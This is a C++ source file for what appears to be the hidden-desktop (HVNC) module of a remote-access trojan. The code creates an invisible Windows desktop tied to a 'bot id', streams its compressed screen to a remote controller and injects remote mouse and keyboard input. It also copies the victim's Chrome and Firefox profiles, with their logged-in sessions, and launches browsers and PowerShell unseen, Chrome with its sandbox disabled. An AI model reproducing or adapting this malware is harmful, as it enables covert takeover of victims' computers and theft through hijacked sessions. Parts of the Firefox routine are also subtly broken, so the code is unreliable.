#include "DesktopManager.h"
#include "../../../PublicInclude/until.h"
#include <WinUser.h> // BlockInput
#include "dwmapi.h"
#pragma comment(lib, "Dwmapi.lib")
#include <stdio.h>
#include<Shlwapi.h>
#pragma comment (lib, "Shlwapi.lib")
#include<ShlObj_core.h>
#include<windowsx.h>
static COLORREF gc_trans;
static BITMAPINFO	g_bmpInfo = {0};
static BYTE* g_pixels ;
static BYTE* g_oldPixels ;
static BYTE* g_tempPixels;
static DWORD g_Width;
static DWORD g_Height;
CDesktopManager::CDesktopManager(CClientSocket* pClient) : CManager(pClient)
{
	gc_trans = RGB(255, 174, 201);

	memset(&g_bmpInfo, 0, sizeof(BITMAPINFO));
	g_pixels = NULL;
	g_oldPixels = NULL;
	g_tempPixels = 0;
	g_Width = 0;
	g_Height = 0;

	g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
	g_bmpInfo.bmiHeader.biPlanes = 1;
	g_bmpInfo.bmiHeader.biBitCount = 24;
	g_bmpInfo.bmiHeader.biCompression = BI_RGB;
	g_bmpInfo.bmiHeader.biClrUsed = 0;

	memset(desktopName, 0, sizeof(desktopName));
	GetBotId(desktopName);

	hDesk = OpenDesktopA(desktopName, 0, TRUE, GENERIC_ALL);
	if (!hDesk)
		hDesk = CreateDesktopA(desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
	SetThreadDesktop(hDesk);

	m_hWorkThread = MyCreateThread(0, 0, WorkThread, this, 0, 0, 0);
}

CDesktopManager::~CDesktopManager()
{
	ExitProcess(0);
	if (g_pixels && g_oldPixels && g_tempPixels)
	{
		LocalFree(g_pixels);
		LocalFree(g_oldPixels);
		LocalFree(g_tempPixels);
	}
}


void CDesktopManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	SetThreadDesktop(hDesk);
	MSG* pMsg = (MSG*)(lpBuffer);
	HWND  hWnd;
	POINT point;
	BOOL  mouseMsg = FALSE;
	POINT lastPointCopy;

	switch (pMsg->message)
	{
		case WM_CHAR:
		case WM_KEYDOWN:
		case WM_KEYUP:
		{
			point = lastPoint;
			hWnd = WindowFromPoint(point);
			break;
		}
		default:
		{
			mouseMsg = TRUE;
			point.x = GET_X_LPARAM(pMsg->lParam);
			point.y = GET_Y_LPARAM(pMsg->lParam);
			lastPointCopy = lastPoint;
			lastPoint = point;

			hWnd = WindowFromPoint(point);
			if (pMsg->message == WM_LBUTTONUP)
			{
				lmouseDown = FALSE;
				LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, pMsg->lParam);

				switch (lResult)
				{
				case HTTRANSPARENT:
				{
					SetWindowLongA(hWnd, GWL_STYLE, GetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
					lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, pMsg->lParam);
					break;
				}
				case HTCLOSE:
				{
					PostMessageA(hWnd, WM_CLOSE, 0, 0);
					break;
				}
				case HTMINBUTTON:
				{
					PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
					break;
				}
				case HTMAXBUTTON:
				{
					WINDOWPLACEMENT windowPlacement;
					windowPlacement.length = sizeof(windowPlacement);
					GetWindowPlacement(hWnd, &windowPlacement);
					if (windowPlacement.flags & SW_SHOWMAXIMIZED)
						PostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
					else
						PostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
					break;
				}
				}
			}
			else if (pMsg->message == WM_LBUTTONDOWN)
			{
				lmouseDown = TRUE;
				hResMoveWindow = NULL;

				RECT startButtonRect;
				HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
				GetWindowRect(hStartButton, &startButtonRect);
				if (PtInRect(&startButtonRect, point))
				{
					PostMessageA(hStartButton, BM_CLICK, 0, 0);
					return;
				}
				else
				{
					char windowClass[MAX_PATH] = { 0 };
					RealGetWindowClassA(hWnd, windowClass, MAX_PATH);

					if (!lstrcmpA(windowClass, "#32768"))
					{
						HMENU hMenu = (HMENU)SendMessageA(hWnd, MN_GETHMENU, 0, 0);
						int itemPos = MenuItemFromPoint(NULL, hMenu, point);
						int itemId = GetMenuItemID(hMenu, itemPos);
						PostMessageA(hWnd, 0x1e5, itemPos, 0);
						PostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
						return;
					}
				}
			}
			else if (pMsg->message == WM_MOUSEMOVE)
			{
				if (!lmouseDown)
					return;

				if (!hResMoveWindow)
					resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, pMsg->lParam);
				else
					hWnd = hResMoveWindow;

				int moveX = lastPointCopy.x - point.x;
				int moveY = lastPointCopy.y - point.y;

				RECT rect;
				GetWindowRect(hWnd, &rect);

				int x = rect.left;
				int y = rect.top;
				int width = rect.right - rect.left;
				int height = rect.bottom - rect.top;
				switch (resMoveType)
				{
				case HTCAPTION:
				{
					x -= moveX;
					y -= moveY;
					break;
				}
				case HTTOP:
				{
					y -= moveY;
					height += moveY;
					break;
				}
				case HTBOTTOM:
				{
					height -= moveY;
					break;
				}
				case HTLEFT:
				{
					x -= moveX;
					width += moveX;
					break;
				}
				case HTRIGHT:
				{
					width -= moveX;
					break;
				}
				case HTTOPLEFT:
				{
					y -= moveY;
					height += moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTTOPRIGHT:
				{
					y -= moveY;
					height += moveY;
					width -= moveX;
					break;
				}
				case HTBOTTOMLEFT:
				{
					height -= moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTBOTTOMRIGHT:
				{
					height -= moveY;
					width -= moveX;
					break;
				}
				default:
					break;
				}
				MoveWindow(hWnd, x, y, width, height, FALSE);
				hResMoveWindow = hWnd;
				break;
			}
		}
	}

	for (HWND currHwnd = hWnd;;)
	{
		hWnd = currHwnd;
		ScreenToClient(currHwnd, &point);
		currHwnd = ChildWindowFromPoint(currHwnd, point);
		if (!currHwnd || currHwnd == hWnd)
			break;
	}


	if (mouseMsg)
		pMsg->lParam = MAKELPARAM(point.x, point.y);

	PostMessageA(hWnd, pMsg->message, pMsg->wParam, pMsg->lParam);
}
void CDesktopManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
	{
		g_Width = *((DWORD*)(lpBuffer + 1));
		g_Height = *((DWORD*)(lpBuffer + 5));
		start = true;
		break;
	}
	case COMMAND_SCREEN_CONTROL:
	{
		ProcessCommand(lpBuffer + 1, nSize - 1);
		break;
	}
	case COMMAND_DESKTOP_EXPLORER: 
		OpenExplorer();
		break;
	case COMMAND_DESKTOP_RUN: 
		OpenRun();
		break;
	case COMMAND_DESKTOP_POWERSHELL: 
		Openpowershell();
		break;
	case COMMAND_DESKTOP_CMROME: 
		OpenChrome();
		break;
	case COMMAND_DESKTOP_EDGE: 
		OpenEdge();
		break;
	case COMMAND_DESKTOP_FIREFOX: 
		OpenFirefox();
		break;
	case COMMAND_DESKTOP_IE:
		OpenIE();
		break;
	default:
		break;
	}
}

DWORD WINAPI CDesktopManager::WorkThread(LPVOID lparam)
{
	CDesktopManager* pThis = (CDesktopManager*)lparam;
	SetThreadDesktop(pThis->hDesk);
	BYTE lpBuffer = TOKEN_DESKTOP;
	pThis->Send(&lpBuffer, 1);
	while (1)
	{
		while (pThis->start)
		{
			pThis->sendScreen(pThis);
		}
	}
	return 0;
}

void CDesktopManager::sendScreen(PVOID classs)
{
	CDesktopManager* pThis = (CDesktopManager*)classs;

	BOOL same = GetDeskPixels();
	if (same)
		return;

	DWORD workSpaceSize;
	DWORD fragmentWorkSpaceSize;

	HANDLE hDLL;
	RtlCompressBuffer_Fn fcmp;
	RtlGetCompressionWorkSpaceSize_Fn fgcw;
	hDLL = LoadLibrary("ntdll.dll");
	if (hDLL != NULL)
	{
		fcmp = (RtlCompressBuffer_Fn)GetProcAddress((HMODULE)hDLL, "RtlCompressBuffer");
		fgcw = (RtlGetCompressionWorkSpaceSize_Fn)GetProcAddress((HMODULE)hDLL, "RtlGetCompressionWorkSpaceSize");

		(*fgcw)(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);

		BYTE* workSpace = (BYTE*)LocalAlloc(LPTR,workSpaceSize);
		DWORD size;
		(*fcmp)(COMPRESSION_FORMAT_LZNT1,
			g_pixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			g_tempPixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			2048,
			&size,
			workSpace);

		LocalFree(workSpace);

		RECT rect;
		HWND hWndDesktop = GetDesktopWindow();
		GetWindowRect(hWndDesktop, &rect);

		PBYTE buff = (PBYTE)LocalAlloc(LPTR, sizeof(DWORD) * 5 + size + 1);
		buff[0] = TOKEN_NEXTSCREEN;
		PDWORD Tmp = (PDWORD)(buff + 1);
		Tmp[0] = rect.right;
		Tmp[1] = rect.bottom;
		Tmp[2] = g_bmpInfo.bmiHeader.biWidth;
		Tmp[3] = g_bmpInfo.bmiHeader.biHeight;
		Tmp[4] = size;
		memcpy(&Tmp[5], g_tempPixels,size);
		pThis->Send(buff, sizeof(DWORD) * 5 + size + 1);
		LocalFree(buff);
	}

}

static void EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
{
	HWND currentWindow = GetTopWindow(owner);
	if (currentWindow == NULL)
		return;
	if ((currentWindow = GetWindow(currentWindow, GW_HWNDLAST)) == NULL)
		return;
	while (proc(currentWindow, param) && (currentWindow = GetWindow(currentWindow, GW_HWNDPREV)) != NULL);
}

static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
{
	BOOL ret = FALSE;
	RECT rect;
	GetWindowRect(hWnd, &rect);

	HDC     hDcWindow = CreateCompatibleDC(hDc);
	HBITMAP hBmpWindow = CreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);

	SelectObject(hDcWindow, hBmpWindow);
	if (PrintWindow(hWnd, hDcWindow, 0))
	{
		BitBlt(hDcScreen,
			rect.left,
			rect.top,
			rect.right - rect.left,
			rect.bottom - rect.top,
			hDcWindow,
			0,
			0,
			SRCCOPY);

		ret = TRUE;
	}
	DeleteObject(hBmpWindow);
	DeleteDC(hDcWindow);
	return ret;
}

static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
{
	EnumHwndsPrintData* data = (EnumHwndsPrintData*)lParam;

	if (!IsWindowVisible(hWnd))
		return TRUE;

	PaintWindow(hWnd, data->hDc, data->hDcScreen);

	DWORD style = GetWindowLongA(hWnd, GWL_EXSTYLE);
	SetWindowLongA(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);

	OSVERSIONINFO versionInfo;
	versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
	GetVersionExA(&versionInfo);
	if (versionInfo.dwMajorVersion < 6)
		EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM)data);
	return TRUE;
}

BOOL CDesktopManager::GetDeskPixels()
{
	DWORD serverWidth = g_Width;
	DWORD serverHeight = g_Height;
	RECT rect;
	HWND hWndDesktop = GetDesktopWindow();
	GetWindowRect(hWndDesktop, &rect);

	HDC     hDc = GetDC(NULL);
	HDC     hDcScreen = CreateCompatibleDC(hDc);
	HBITMAP hBmpScreen = CreateCompatibleBitmap(hDc, rect.right, rect.bottom);
	SelectObject(hDcScreen, hBmpScreen);

	EnumHwndsPrintData data;
	data.hDc = hDc;
	data.hDcScreen = hDcScreen;
	EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

	if (serverWidth > rect.right)
		serverWidth = rect.right;
	if (serverHeight > rect.bottom)
		serverHeight = rect.bottom;

	if (serverWidth != rect.right || serverHeight != rect.bottom)
	{
		HBITMAP hBmpScreenResized = CreateCompatibleBitmap(hDc, serverWidth, serverHeight);
		HDC     hDcScreenResized = CreateCompatibleDC(hDc);

		SelectObject(hDcScreenResized, hBmpScreenResized);
		SetStretchBltMode(hDcScreenResized, HALFTONE);
		StretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
			hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY);

		DeleteObject(hBmpScreen);
		DeleteDC(hDcScreen);

		hBmpScreen = hBmpScreenResized;
		hDcScreen = hDcScreenResized;
	}


	BOOL comparePixels = TRUE;

	g_bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;

	if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != serverWidth || g_bmpInfo.bmiHeader.biHeight != serverHeight))
	{
		LocalFree(g_pixels);
		LocalFree(g_oldPixels);
		LocalFree(g_tempPixels);

		g_pixels = (BYTE*)LocalAlloc(LPTR,g_bmpInfo.bmiHeader.biSizeImage);
		g_oldPixels = (BYTE*)LocalAlloc(LPTR,g_bmpInfo.bmiHeader.biSizeImage);
		g_tempPixels = (BYTE*)LocalAlloc(LPTR,g_bmpInfo.bmiHeader.biSizeImage);
		comparePixels = FALSE;
	}

	g_bmpInfo.bmiHeader.biWidth = serverWidth;
	g_bmpInfo.bmiHeader.biHeight = serverHeight;
	GetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS);
	DeleteObject(hBmpScreen);
	ReleaseDC(NULL, hDc);
	DeleteDC(hDcScreen);
	if (comparePixels)
	{
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3)
		{
			if (g_pixels[i] == GetRValue(gc_trans) &&
				g_pixels[i + 1] == GetGValue(gc_trans) &&
				g_pixels[i + 2] == GetBValue(gc_trans))
			{
				++g_pixels[i + 1];
			}
		}
		memcpy(g_tempPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage); //TODO: CRT call
		BOOL same = TRUE;
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage - 1; i += 3)
		{
			if (g_pixels[i] == g_oldPixels[i] &&
				g_pixels[i + 1] == g_oldPixels[i + 1] &&
				g_pixels[i + 2] == g_oldPixels[i + 2])
			{
				g_pixels[i] = GetRValue(gc_trans);
				g_pixels[i + 1] = GetGValue(gc_trans);
				g_pixels[i + 2] = GetBValue(gc_trans);
			}
			else
				same = FALSE;
		}
		if (same)
			return TRUE;

		memcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage); //TODO: CRT call
	}
	else
		memcpy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
	return FALSE;
}

void CDesktopManager::GetBotId(char* botId)
{
	CHAR windowsDirectory[MAX_PATH];
	CHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (GetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
		windowsDirectory[0] = L'C';

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = ':';
	volumeName[2] = '\\';
	volumeName[3] = '\0';

	GetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);

	wsprintfA(botId, (PCHAR)"%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
}

ULONG CDesktopManager::PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

void CDesktopManager::CopyDir(char* from, char* to)
{
	char fromWildCard[MAX_PATH] = { 0 };
	lstrcpyA(fromWildCard, from);
	lstrcatA(fromWildCard, (PCHAR)"\\*");

	if (!CreateDirectoryA(to, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return;
	WIN32_FIND_DATAA findData;
	HANDLE hFindFile = FindFirstFileA(fromWildCard, &findData);
	if (hFindFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		char currFileFrom[MAX_PATH] = { 0 };
		lstrcpyA(currFileFrom, from);
		lstrcatA(currFileFrom, (PCHAR)"\\");
		lstrcatA(currFileFrom, findData.cFileName);

		char currFileTo[MAX_PATH] = { 0 };
		lstrcpyA(currFileTo, to);
		lstrcatA(currFileTo, (PCHAR)"\\");
		lstrcatA(currFileTo, findData.cFileName);

		if
			(
				findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				lstrcmpA(findData.cFileName, (PCHAR)".") &&
				lstrcmpA(findData.cFileName, (PCHAR)"..")
				)
		{
			if (CreateDirectoryA(currFileTo, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
				CopyDir(currFileFrom, currFileTo);
		}
		else
			CopyFileA(currFileFrom, currFileTo, FALSE);
	} while (FindNextFileA(hFindFile, &findData));
}
void CDesktopManager::OpenExplorer()
{
	const DWORD neverCombine = 2;
	const char* valueName = "TaskbarGlomLevel";
	HKEY hKey;
	RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_ALL_ACCESS, &hKey);

	DWORD value;
	DWORD size = sizeof(DWORD);
	DWORD type = REG_DWORD;

	RegQueryValueExA(hKey, valueName, 0, &type, (BYTE*)&value, &size);

	if (value != neverCombine)
		RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)&neverCombine, size);

	char explorerPath[MAX_PATH] = { 0 };
	GetWindowsDirectoryA(explorerPath, MAX_PATH);
	lstrcatA(explorerPath, "\\");
	lstrcatA(explorerPath, "explorer.exe");

	MyCreateProcess(explorerPath);

	APPBARDATA appbarData;
	appbarData.cbSize = sizeof(appbarData);

	for (int i = 0; i < 5; ++i)
	{
		Sleep(1000);
		appbarData.hWnd = FindWindowA("shell_TrayWnd", NULL);
		if (appbarData.hWnd)
			break;
	}

	appbarData.lParam = ABS_ALWAYSONTOP;
	SHAppBarMessage(ABM_SETSTATE, &appbarData);

	RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)&value, size);
	RegCloseKey(hKey);
}
void CDesktopManager::OpenRun()
{
	char rundllPath[MAX_PATH] = { 0 };
	SHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
	lstrcatA(rundllPath, "\\rundll32.exe shell32.dll,#61");
	MyCreateProcess(rundllPath);
}
void CDesktopManager::OpenChrome()
{
	char chromePath[MAX_PATH] = { 0 };
	SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
	lstrcatA(chromePath, "\\Google\\Chrome\\");

	char dataPath[MAX_PATH] = { 0 };
	lstrcatA(dataPath, chromePath);
	lstrcatA(dataPath, "User Data\\");

	char botId[BOT_ID_LEN] = { 0 };
	char newDataPath[MAX_PATH] = { 0 };
	lstrcatA(newDataPath, chromePath);
	GetBotId(botId);
	lstrcatA(newDataPath, botId);

	CopyDir(dataPath, newDataPath);

	char path[MAX_PATH] = { 0 };
	lstrcatA(path, "cmd.exe /c start ");
	lstrcatA(path, "chrome.exe");
	lstrcatA(path, " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11  --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=");
	lstrcatA(path, (PCHAR)"\"");
	lstrcatA(path, newDataPath);

	MyCreateProcess(path);
}
void  CDesktopManager::Openpowershell()
{
	char path[MAX_PATH] = { 0 };
	lstrcpyA(path, "cmd.exe /c start ");
	lstrcatA(path, "powershell");
	MyCreateProcess(path);
}
void CDesktopManager::OpenEdge()
{
	char path[MAX_PATH] = { 0 };
	lstrcpyA(path, "cmd.exe /c start ");
	lstrcatA(path, "msedge.exe");

	MyCreateProcess(path);
}
void CDesktopManager::OpenFirefox()
{
	char firefoxPath[MAX_PATH] = { 0 };
	SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, firefoxPath);
	lstrcatA(firefoxPath, "\\Mozilla\\Firefox\\");

	char profilesIniPath[MAX_PATH] = { 0 };
	lstrcatA(profilesIniPath, firefoxPath);
	lstrcatA(profilesIniPath, "TaskbarGlomLevel");

	HANDLE hProfilesIni = CreateFileA
	(
		profilesIniPath,
		FILE_READ_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hProfilesIni == INVALID_HANDLE_VALUE)
		return;

	DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
	DWORD read;
	char* profilesIniContent = (char*)malloc(profilesIniSize + 1);
	ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
	profilesIniContent[profilesIniSize] = 0;


	char* isRelativeRead = StrStrA(profilesIniContent, "IsRelative=");
	if (!isRelativeRead)
		exit;
	isRelativeRead += 11;
	BOOL isRelative = (*isRelativeRead == '1');

	char* path = StrStrA(profilesIniContent, "Path=");
	if (!path)
		exit;
	char* pathEnd = StrStrA(path, (PCHAR)"\r");
	if (!pathEnd)
		exit;
	*pathEnd = 0;
	path += 5;

	char realPath[MAX_PATH] = { 0 };
	if (isRelative)
		lstrcpyA(realPath, firefoxPath);
	lstrcatA(realPath, path);

	char botId[BOT_ID_LEN];
	GetBotId(botId);

	char newPath[MAX_PATH];
	lstrcpyA(newPath, firefoxPath);
	lstrcpyA(newPath, botId);

	CopyDir(realPath, newPath);

	char browserPath[MAX_PATH] = { 0 };
	lstrcpyA(browserPath, "cmd.exe /c start ");
	lstrcpyA(browserPath, "firefox.exe");
	lstrcpyA(browserPath, " -no-remote -profile ");
	lstrcpyA(browserPath, (PCHAR)"\"");
	lstrcpyA(browserPath, newPath);
	lstrcpyA(browserPath, (PCHAR)"\"");

	MyCreateProcess(browserPath);

exit:
	CloseHandle(hProfilesIni);
	free(profilesIniContent);
}
void CDesktopManager::OpenIE()
{
	char path[MAX_PATH] = { 0 };
	lstrcpyA(path, "cmd.exe /c start ");
	lstrcatA(path, "iexplore.exe");
	
	MyCreateProcess(path);
}
void CDesktopManager::MyCreateProcess(char* command)
{
	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	CreateProcessA(command, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}